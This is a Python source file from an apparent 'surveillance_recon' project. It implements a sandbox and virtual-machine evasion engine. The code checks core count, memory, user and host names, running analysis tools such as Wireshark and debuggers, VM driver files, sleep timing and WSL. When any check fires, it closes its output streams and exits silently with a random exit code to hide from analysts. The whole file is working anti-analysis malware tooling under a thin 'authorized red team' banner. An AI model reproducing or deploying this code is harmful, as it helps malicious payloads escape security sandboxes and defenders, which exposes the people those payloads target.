# surveillance_recon/utils/evasion.py
# [SecOps Research // Advanced Sandbox & VM Evasion Engine v2.0]
# For authorized red team use under Security Research Protocol §7. Unauthorized execution environments will be aborted.

import os
import sys
import time
import random
import platform
import subprocess
import ctypes
from typing import List, Dict, Any

class SandboxDetector:
    """
    Multi-layered evasion engine that detects:
    - Virtual machines (VMware, VirtualBox, Hyper-V, QEMU, WSL)
    - Sandboxes (Cuckoo, ANY.RUN, Hybrid-Analysis)
    - Debuggers, analysis tools, and suspicious environments
    - Low-resource or automated test systems

    If evasion triggers, the process exits silently with no trace.
    """

    def __init__(self):
        self.triggers = []
        self.os_type = platform.system().lower()

    def _check_cpu_cores(self) -> bool:
        """Sandboxes often run on 1-2 cores"""
        cores = os.cpu_count()
        if cores is None:
            return True  # Unknown = suspicious
        return cores < 2

    def _check_memory(self) -> bool:
        """Low RAM = likely sandbox"""
        try:
            if self.os_type == "windows":
                kernel32 = ctypes.windll.kernel32
                kernel32.GlobalMemoryStatusEx.argtypes = [ctypes.c_void_p]
                class MEMORYSTATUSEX(ctypes.Structure):
                    _fields_ = [
                        ("dwLength", ctypes.c_ulong),
                        ("dwMemoryLoad", ctypes.c_ulong),
                        ("ullTotalPhys", ctypes.c_ulonglong),
                        ("ullAvailPhys", ctypes.c_ulonglong),
                        ("ullTotalPageFile", ctypes.c_ulonglong),
                        ("ullAvailPageFile", ctypes.c_ulonglong),
                        ("ullTotalVirtual", ctypes.c_ulonglong),
                        ("ullAvailVirtual", ctypes.c_ulonglong),
                        ("sullAvailExtendedVirtual", ctypes.c_ulonglong),
                    ]
                mem = MEMORYSTATUSEX()
                mem.dwLength = ctypes.sizeof(MEMORYSTATUSEX)
                kernel32.GlobalMemoryStatusEx(ctypes.byref(mem))
                total_gb = mem.ullTotalPhys / (1024**3)
                return total_gb < 2.0
            elif self.os_type == "linux":
                with open("/proc/meminfo", "r") as f:
                    for line in f:
                        if line.startswith("MemTotal:"):
                            kb = int(line.split()[1])
                            gb = kb / (1024**2)
                            return gb < 2.0
        except:
            pass
        return False

    def _check_username(self) -> bool:
        """Sandbox usernames are often generic"""
        suspicious_users = {
            "windows": ["user", "admin", "test", "malware", "sandbox", "virus", "analyst", "guest"],
            "linux": ["user", "test", "ubuntu", "kali", "root", "malware", "cuckoo", "anyrun"]
        }
        try:
            current = os.getlogin().lower()
            for sus in suspicious_users.get(self.os_type, suspicious_users["linux"]):
                if sus in current:
                    return True
        except:
            pass
        return False

    def _check_hostname(self) -> bool:
        """Sandbox hostnames are predictable"""
        suspicious_hosts = ["sandbox", "cuckoo", "malware", "analysis", "test", "vbox", "vmware"]
        try:
            host = platform.node().lower()
            return any(sus in host for sus in suspicious_hosts)
        except:
            return True  # Unknown = suspicious

    def _check_processes(self) -> bool:
        """Look for analysis/debug tools"""
        suspicious_procs = [
            "wireshark", "procmon", "procexp", "x64dbg", "ollydbg", "idag", "cuckoo",
            "vmtools", "vboxservice", "qemu", "xenservice", "fakenet", "apimonitor"
        ]
        try:
            if self.os_type == "windows":
                output = subprocess.check_output("tasklist", shell=True, stderr=subprocess.DEVNULL).decode().lower()
            else:
                output = subprocess.check_output(["ps", "aux"], stderr=subprocess.DEVNULL).decode().lower()
            return any(proc in output for proc in suspicious_procs)
        except:
            pass
        return False

    def _check_files_and_paths(self) -> bool:
        """Check for VM/sandbox artifacts"""
        vm_files = [
            # Windows
            "C:\\windows\\system32\\drivers\\vmmouse.sys",
            "C:\\windows\\system32\\drivers\\vm3dgl.dll",
            "C:\\windows\\system32\\drivers\\vboxmouse.sys",
            "C:\\windows\\system32\\drivers\\VBoxGuest.sys",
            # Linux
            "/sys/class/dmi/id/product_name",
            "/proc/scsi/scsi"
        ]
        for f in vm_files:
            if os.path.exists(f):
                if "product_name" in f:
                    try:
                        with open(f, "r") as pf:
                            content = pf.read().lower()
                            if any(vm in content for vm in ["virtualbox", "vmware", "qemu", "xen", "hyperv"]):
                                return True
                    except: pass
                else:
                    return True
        return False

    def _check_timing_artifacts(self) -> bool:
        """Sandboxes often speed up time or have inconsistent sleep"""
        start = time.time()
        time.sleep(1)
        elapsed = time.time() - start
        # If sleep took <0.8s, likely time-warping sandbox
        return elapsed < 0.8

    def _check_wsl(self) -> bool:
        """Detect Windows Subsystem for Linux (not real hardware)"""
        if self.os_type == "linux":
            try:
                with open("/proc/version", "r") as f:
                    if "microsoft" in f.read().lower():
                        return True
            except: pass
        return False

    def is_sandboxed(self) -> bool:
        """
        Run all evasion checks.
        Returns True if ANY evasion trigger fires.
        """
        checks = [
            ("low_cpu", self._check_cpu_cores),
            ("low_memory", self._check_memory),
            ("suspicious_user", self._check_username),
            ("suspicious_hostname", self._check_hostname),
            ("analysis_processes", self._check_processes),
            ("vm_artifacts", self._check_files_and_paths),
            ("timing_anomaly", self._check_timing_artifacts),
            ("wsl_detected", self._check_wsl)
        ]

        for name, check_fn in checks:
            try:
                if check_fn():
                    self.triggers.append(name)
            except Exception as e:
                # Log internally (never to console)
                pass

        return len(self.triggers) > 0

    def abort_if_sandboxed(self):
        """
        Silent abort with no output, no crash, no log.
        Exit code randomized to avoid pattern detection.
        """
        if self.is_sandboxed():
            try:
                # Flush and close all streams
                sys.stdout.flush()
                sys.stderr.flush()
                os.close(1)
                os.close(2)
            except: pass
            # Exit with random code (0-255) to mimic normal failure
            os._exit(random.randint(0, 255))

    def get_triggers(self) -> List[str]:
        """For debugging only (never used in prod)"""
        return self.triggers.copy()
